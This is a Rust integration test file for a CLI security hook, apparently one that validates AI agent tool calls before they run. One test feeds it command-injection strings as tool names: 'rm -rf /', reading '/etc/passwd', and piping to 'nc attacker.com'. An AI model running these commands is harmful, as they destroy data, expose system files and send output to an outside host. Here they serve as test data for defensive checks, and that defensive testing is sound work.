//! Minimal integration tests for end-to-end security validation
//!
//! These tests verify the complete CLI flow but are kept minimal since
//! the actual validation logic is thoroughly tested in security_unit.rs

use assert_cmd::Command;
use serde_json::json;

/// Test that the CLI properly rejects malformed JSON
#[test]
fn test_cli_rejects_malformed_json() {
    let output = Command::cargo_bin("maos")
        .unwrap()
        .arg("pre-tool-use")
        .write_stdin("{invalid json")
        .output()
        .expect("Failed to execute command");

    assert!(!output.status.success());
    assert_eq!(output.status.code(), Some(1)); // GeneralError
}

/// Test that the CLI properly handles missing required fields
#[test]
fn test_cli_validates_required_fields() {
    let input = json!({
        "session_id": "test",
        "transcript_path": "/tmp/transcript.jsonl",
        "cwd": "/tmp",
        "hook_event_name": "pre_tool_use",
        // Missing required tool_name field
    })
    .to_string();

    let output = Command::cargo_bin("maos")
        .unwrap()
        .arg("pre-tool-use")
        .write_stdin(input.as_bytes())
        .output()
        .expect("Failed to execute command");

    assert!(!output.status.success());
}

/// Test that valid input is accepted
#[test]
fn test_cli_accepts_valid_input() {
    let input = json!({
        "session_id": "test",
        "transcript_path": "/tmp/transcript.jsonl",
        "cwd": "/tmp",
        "hook_event_name": "pre_tool_use",
        "tool_name": "Read",
        "tool_input": {"file_path": "/tmp/test.txt"}
    })
    .to_string();

    let output = Command::cargo_bin("maos")
        .unwrap()
        .arg("pre-tool-use")
        .write_stdin(input.as_bytes())
        .output()
        .expect("Failed to execute command");

    assert!(output.status.success());
}

/// Test command injection prevention at CLI level
#[test]
fn test_cli_prevents_command_injection() {
    // Even though we test this in unit tests, verify the CLI also handles it
    let dangerous_inputs = vec![
        "Read; rm -rf /",
        "Read && cat /etc/passwd",
        "Read | nc attacker.com 1234",
    ];

    for tool_name in dangerous_inputs {
        let input = json!({
            "session_id": "test",
            "transcript_path": "/tmp/transcript.jsonl",
            "cwd": "/tmp",
            "hook_event_name": "pre_tool_use",
            "tool_name": tool_name,
            "tool_input": {"file_path": "/tmp/test.txt"}
        })
        .to_string();

        let output = Command::cargo_bin("maos")
            .unwrap()
            .arg("pre-tool-use")
            .write_stdin(input.as_bytes())
            .output()
            .expect("Failed to execute command");

        // Should handle gracefully (not crash)
        assert!(output.status.code().is_some());
    }
}
